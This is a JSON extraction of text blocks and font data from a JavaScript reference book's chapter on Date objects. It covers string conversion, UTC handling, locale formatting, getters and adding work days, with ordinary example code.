    },
    {
        "text": "Returns: \"Fri, 15 Apr 2016 11:48:48 GMT\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Convert to ISO String",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  date1  =   new  Date (); date1. toISOString ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Returns: \"2016-04-14T23:49:08.596Z\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 50",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Convert to GMT String",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  date1  =   new  Date (); date1. toGMTString ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Returns: \"Thu, 14 Apr 2016 23:49:08 GMT\" This function has been marked as deprecated so some browsers may not support it in the future. It is suggested to use toUTCString() instead.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Convert to Locale Date String",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  date1  =   new  Date (); date1. toLocaleDateString ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Returns: \"4/14/2016\" This function returns a locale sensitive date string based upon the user's location by default.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "date1. toLocaleDateString ([ locales  [,  options ]])",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "can be used to provide speci\ufb01c locales but is browser implementation speci\ufb01c. For example,",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "date1. toLocaleDateString ([ \"zh\" ,   \"en-US\" ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "would attempt to print the string in the Chinese locale using United States English as a fallback. The options parameter can be used to provide speci\ufb01c formatting. For example:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  options  =   {  weekday :   'long' ,  year :   'numeric' ,  month :   'long' ,  day :   'numeric'   }; date1. toLocaleDateString ([],  options );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "would result in \"Thursday, April 14, 2016\". See  the MDN  for more details.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 8.3: Creating a Date from UTC",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "By default, a  Date  object is created as local time. This is not always desirable, for example when communicating a date between a server and a client that do not reside in the same timezone. In this scenario, one doesn't want to worry about timezones at all until the date needs to be displayed in local time, if that is even required at all.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The problem",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "In this problem we want to communicate a speci\ufb01c date (day, month, year) with someone in a di\ufb00erent timezone. The \ufb01rst implementation naively uses local times, which results in wrong results. The second implementation uses UTC dates to avoid timezones where they are not needed.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Naive approach with WRONG results",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 51",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  formatDate ( dayOfWeek ,  day ,  month ,  year )   {    var  daysOfWeek  =   [ \"Sun\" , \"Mon\" , \"Tue\" , \"Wed\" , \"Thu\" , \"Fri\" , \"Sat\" ];    var  months  =   [ \"Jan\" , \"Feb\" , \"Mar\" , \"Apr\" , \"May\" , \"Jun\" , \"Jul\" , \"Aug\" , \"Sep\" , \"Oct\" , \"Nov\" , \"Dec\" ];    return  daysOfWeek [ dayOfWeek ]   +   \" \"   +  months [ month ]   +   \" \"   +  day  +   \" \"   +  year ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//Foo lives in a country with timezone GMT + 1",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  birthday  =   new  Date ( 2000 , 0 , 1 ); console. log ( \"Foo was born on: \"   +  formatDate ( birthday. getDay (),  birthday. getDate (),       birthday. getMonth (),  birthday. getFullYear ())); sendToBar ( birthday. getTime ());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample output:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Foo was born on: Sat Jan 1 2000",
        "font_name": "DejaVuSansMono",
        "font_size": 10,
        "img": []
    },
    {
        "text": "//Meanwhile somewhere else... //Bar lives in a country with timezone GMT - 1",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  birthday  =   new  Date ( receiveFromFoo ()); console. log ( \"Foo was born on: \"   +  formatDate ( birthday. getDay (),  birthday. getDate (),       birthday. getMonth (),  birthday. getFullYear ()));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample output:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Foo was born on: Fri Dec 31 1999",
        "font_name": "DejaVuSansMono",
        "font_size": 10,
        "img": []
    },
    {
        "text": "And thus, Bar would always believe Foo was born on the last day of 1999.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Correct approach",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  formatDate ( dayOfWeek ,  day ,  month ,  year )   {    var  daysOfWeek  =   [ \"Sun\" , \"Mon\" , \"Tue\" , \"Wed\" , \"Thu\" , \"Fri\" , \"Sat\" ];    var  months  =   [ \"Jan\" , \"Feb\" , \"Mar\" , \"Apr\" , \"May\" , \"Jun\" , \"Jul\" , \"Aug\" , \"Sep\" , \"Oct\" , \"Nov\" , \"Dec\" ];    return  daysOfWeek [ dayOfWeek ]   +   \" \"   +  months [ month ]   +   \" \"   +  day  +   \" \"   +  year ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//Foo lives in a country with timezone GMT + 1",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  birthday  =   new  Date ( Date. UTC ( 2000 , 0 , 1 )); console. log ( \"Foo was born on: \"   +  formatDate ( birthday. getUTCDay (),  birthday. getUTCDate (),       birthday. getUTCMonth (),  birthday. getUTCFullYear ())); sendToBar ( birthday. getTime ());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample output:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Foo was born on: Sat Jan 1 2000",
        "font_name": "DejaVuSansMono",
        "font_size": 10,
        "img": []
    },
    {
        "text": "//Meanwhile somewhere else... //Bar lives in a country with timezone GMT - 1",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  birthday  =   new  Date ( receiveFromFoo ());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 52",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( \"Foo was born on: \"   +  formatDate ( birthday. getUTCDay (),  birthday. getUTCDate (),       birthday. getUTCMonth (),  birthday. getUTCFullYear ()));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample output:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Foo was born on: Sat Jan 1 2000",
        "font_name": "DejaVuSansMono",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Creating a Date from UTC",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "If one wants to create a  Date  object based on UTC or GMT, the  Date. UTC ( ... )  method can be used. It uses the same arguments as the longest  Date  constructor. This method will return a number representing the time that has passed since January 1, 1970, 00:00:00 UTC.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( Date. UTC ( 2000 , 0 , 31 , 12 ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample output:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "949320000000",
        "font_name": "DejaVuSansMono",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  utcDate  =   new  Date ( Date. UTC ( 2000 , 0 , 31 , 12 )); console. log ( utcDate );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample output:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Mon Jan 31 2000 13:00:00 GMT+0100 (West-Europa (standaardtijd))",
        "font_name": "DejaVuSansMono",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Unsurprisingly, the di\ufb00erence between UTC time and local time is, in fact, the timezone o\ufb00set converted to milliseconds.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  utcDate  =   new  Date ( Date. UTC ( 2000 , 0 , 31 , 12 )); var  localDate  =   new  Date ( 2000 , 0 , 31 , 12 ); console. log ( localDate  -  utcDate  ===  utcDate. getTimezoneOffset ()   *   60   *   1000 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample output:  true",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Changing a Date object",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "All  Date  object modi\ufb01ers, such as  setDate ( ... )  and  setFullYear ( ... )  have an equivalent takes an argument in UTC time rather than in local time.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  date  =   new  Date (); date. setUTCFullYear ( 2000 , 0 , 31 ); date. setUTCHours ( 12 , 0 , 0 , 0 ); console. log ( date );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample output:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 53",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Mon Jan 31 2000 13:00:00 GMT+0100 (West-Europa (standaardtijd))",
        "font_name": "DejaVuSansMono",
        "font_size": 10,
        "img": []
    },
    {
        "text": "The other UTC-speci\ufb01c modi\ufb01ers are  . setUTCMonth () ,  . setUTCDate ()  (for the day of the month),",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": ". setUTCMinutes () ,  . setUTCSeconds ()  and  . setUTCMilliseconds () .",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Avoiding ambiguity with getTime() and setTime()",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Where the methods above are required to di\ufb00erentiate between ambiguity in dates, it is usually easier to communicate a date as the amount of time that has passed since January 1, 1970, 00:00:00 UTC. This single number represents a single point in time, and can be converted to local time whenever necessary.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  date  =   new  Date ( Date. UTC ( 2000 , 0 , 31 , 12 )); var  timestamp  =  date. getTime ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//Alternatively",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  timestamp2  =  Date. UTC ( 2000 , 0 , 31 , 12 ); console. log ( timestamp  ===  timestamp2 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample output:  true",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "//And when constructing a date from it elsewhere...",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  otherDate  =   new  Date ( timestamp );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//Represented as a universal date",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( otherDate. toUTCString ());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "//Represented as a local date",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( otherDate );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Sample output:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Mon, 31 Jan 2000 12:00:00 GMT Mon Jan 31 2000 13:00:00 GMT+0100 (West-Europa (standaardtijd))",
        "font_name": "DejaVuSansMono",
        "font_size": 9,
        "img": []
    },
    {
        "text": "/code>",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 8.4: Formatting a JavaScript date",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Formatting a JavaScript date in modern browsers",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "In modern browsers (*),  Date. prototype . toLocaleDateString ()  allows you to de\ufb01ne the formatting of a  Date  in a convenient manner. It requires the following format :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "dateObj. toLocaleDateString ([ locales  [,  options ]])",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  locales  parameter should be a string with a BCP 47 language tag, or an array of such strings. The  options  parameter should be an object with some or all of the following properties: localeMatcher  : possible values are  \"lookup\"  and  \"best fit\" ; the default is  \"best fit\" timeZone  : the only value implementations must recognize is  \"UTC\" ; the default is the runtime's default time",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 54 zone",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "hour12  :possible values are  true  and  false ; the default is locale dependent formatMatcher  : possible values are  \"basic\"  and  \"best fit\" ; the default is  \"best fit\" weekday  : possible values are  \"narrow\" ,  \"short\"  &  \"long\" era  : possible values are  \"narrow\" ,  \"short\"  &  \"long\" year  : possible values are  \"numeric\"  &  \"2-digit\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "month  : possible values are  \"numeric\" ,  \"2-digit\" ,  \"narrow\" ,  \"short\"  &  \"long\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "day  : possible values are  \"numeric\"  &  \"2-digit\" hour  : possible values are  \"numeric\"  &  \"2-digit\" minute  : possible values are  \"numeric\"  &  \"2-digit\" second  : possible values are  \"numeric\"  &  \"2-digit\" timeZoneName  : possible values are  \"short\"  &  \"long\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "How to use",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  today  =   new  Date () . toLocaleDateString ( 'en-GB' ,   {        day  :   'numeric' ,     month  :   'short' ,     year  :   'numeric' });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Output if executed on January 24 \ufffd\u02b0 , 2036 :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "'24 Jan 2036'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Going custom",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "If  Date. prototype . toLocaleDateString ()  isn't \ufb02exible enough to ful\ufb01ll whatever need you may have, you might want to consider creating a custom Date object that looks like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  DateObject  =   ( function ()   {      var  monthNames  =   [        \"January\" ,   \"February\" ,   \"March\" ,        \"April\" ,   \"May\" ,   \"June\" ,   \"July\" ,        \"August\" ,   \"September\" ,   \"October\" ,        \"November\" ,   \"December\"      ];      var  date  =   function ( str )   {          this . set ( str );      };     date. prototype   =   {          set   :   function ( str )   {              var  dateDef  =  str  ?   new  Date ( str )   :   new  Date ();              this . day   =  dateDef. getDate ();              this . dayPadded   =   ( this . day   <   10 )   ?   ( \"0\"   +   this . day )   :   \"\"   +   this . day ;              this . month   =  dateDef. getMonth ()   +   1 ;              this . monthPadded   =   ( this . month   <   10 )   ?   ( \"0\"   +   this . month )   :   \"\"   +   this . month ;              this . monthName   =  monthNames [ this . month   -   1 ];              this . year   =  dateDef. getFullYear ();          },          get   :   function ( properties ,  separator )   {              var  separator  =  separator  ?  separator  :   '-'                 ret  =   [];              for ( var  i  in  properties )   {                 ret. push ( this [ properties [ i ]]);              }              return  ret. join ( separator );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 55",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "         }      };      return  date ; })();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "If you included that code and executed  new  DateObject ()  on January 20 \ufffd\u02b0 , 2019, it would produce an object with the following properties:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "day :   20 dayPadded :   \"20\" month :   1 monthPadded :   \"01\" monthName :   \"January\" year :   2019",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "To get a formatted string, you could do something like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "new  DateObject () . get ([ 'dayPadded' ,   'monthPadded' ,   'year' ]);",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "That would produce the following output:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "20-01-2016",
        "font_name": "DejaVuSansMono",
        "font_size": 9,
        "img": []
    },
    {
        "text": "(*)  According to the MDN , \"modern browsers\" means Chrome 24+, Firefox 29+, IE11, Edge12+, Opera 15+ & Safari",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "nightly build",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 8.5: Get the number of milliseconds elapsed since 1 January 1970 00:00:00 UTC",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The static method  Date. now  returns the number of milliseconds that have elapsed since 1 January 1970 00:00:00 UTC. To get the number of milliseconds that have elapsed since that time using an instance of a  Date  object, use its getTime  method.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// get milliseconds using static method now of Date",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( Date. now ());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// get milliseconds using method getTime of Date instance",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log (( new  Date ()) . getTime ());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 8.6: Get the current time and date",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Use  new  Date ()  to generate a new  Date  object containing the current date and time.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Note that   Date ()   called without arguments is equivalent to   new  Date ( Date. now ()) .",
        "font_name": "OpenSans-Italic",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Once you have a date object, you can apply any of the several available methods to extract its properties (e.g. getFullYear ()  to get the 4-digits year). Below are some common date methods.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Get the current year",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  year  =   ( new  Date ()) . getFullYear (); console. log ( year );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Sample output: 2016",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 56",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Get the current month",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  month  =   ( new  Date ()) . getMonth (); console. log ( month );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Sample output: 0",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Please note that 0 = January. This is because months range from  0  to  11 , so it is often desirable to add  +1  to the index.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Get the current day",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  day  =   ( new  Date ()) . getDate (); console. log ( day );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Sample output: 31",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Get the current hour",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  hours  =   ( new  Date ()) . getHours (); console. log ( hours );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Sample output: 10",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Get the current minutes",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  minutes  =   ( new  Date ()) . getMinutes (); console. log ( minutes );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Sample output: 39",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Get the current seconds",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  seconds  =   ( new  Date ()) . getSeconds (); console. log ( second );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Sample output: 48",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Get the current milliseconds",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "To get the milliseconds (ranging from 0 to 999) of an instance of a  Date  object, use its  getMilliseconds  method.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  milliseconds  =   ( new  Date ()) . getMilliseconds (); console. log ( milliseconds );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "  // Output: milliseconds right now",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Convert the current time and date to a human-readable string",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  now  =   new  Date ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// convert date to a string in UTC timezone format:",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( now. toUTCString ());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// Output: Wed, 21 Jun 2017 09:13:01 GMT",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The static method  Date. now ()  returns the number of milliseconds that have elapsed since 1 January 1970 00:00:00 UTC. To get the number of milliseconds that have elapsed since that time using an instance of a  Date  object, use its getTime  method.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// get milliseconds using static method now of Date",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( Date. now ());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// get milliseconds using method getTime of Date instance",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log (( new  Date ()) . getTime ());",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 8.7: Increment a Date Object",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To increment date objects in JavaScript, we can usually do this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  checkoutDate  =   new  Date ();      // Thu Jul 21 2016 10:05:13 GMT-0400 (EDT)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "checkoutDate. setDate (  checkoutDate. getDate ()   +   1   );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 57",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( checkoutDate );   // Fri Jul 22 2016 10:05:13 GMT-0400 (EDT)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "It is possible to use  setDate  to change the date to a day in the following month by using a value larger than the number of days in the current month -",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  checkoutDate  =   new  Date ();      // Thu Jul 21 2016 10:05:13 GMT-0400 (EDT)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "checkoutDate. setDate (  checkoutDate. getDate ()   +   12   );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "console. log ( checkoutDate );   // Tue Aug 02 2016 10:05:13 GMT-0400 (EDT)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The same applies to other methods such as getHours(), getMonth(),etc.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Adding Work Days",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "If you wish to add work days (in this case I am assuming Monday - Friday) you can use the  setDate  function although you need a little extra logic to account for the weekends (obviously this will not take account of national holidays) -",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  addWorkDays ( startDate ,  days )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // Get the day of the week as a number (0 = Sunday, 1 = Monday, .... 6 = Saturday)",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     var  dow  =  startDate. getDay ();      var  daysToAdd  =  days ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // If the current day is Sunday add one day",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     if   ( dow  ==   0 )         daysToAdd ++;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     // If the start date plus the additional days falls on or after the closest Saturday calculate weekends",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     if   ( dow  +  daysToAdd  >=   6 )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         //Subtract days in current working week from work days",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         var  remainingWorkDays  =  daysToAdd  -   ( 5   -  dow );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         //Add current working week's weekend",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        daysToAdd  +=   2 ;          if   ( remainingWorkDays  >   5 )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "             //Add two days for each working week by calculating how many weeks are included",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "            daysToAdd  +=   2   *  Math. floor ( remainingWorkDays  /   5 );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "             //Exclude final weekend if remainingWorkDays resolves to an exact number of weeks",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "             if   ( remainingWorkDays  %   5   ==   0 )                 daysToAdd  -=   2 ;          }      }     startDate. setDate ( startDate. getDate ()   +  daysToAdd );      return  startDate ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 8.8: Convert to JSON",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "var  date1  =   new  Date (); date1. toJSON ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
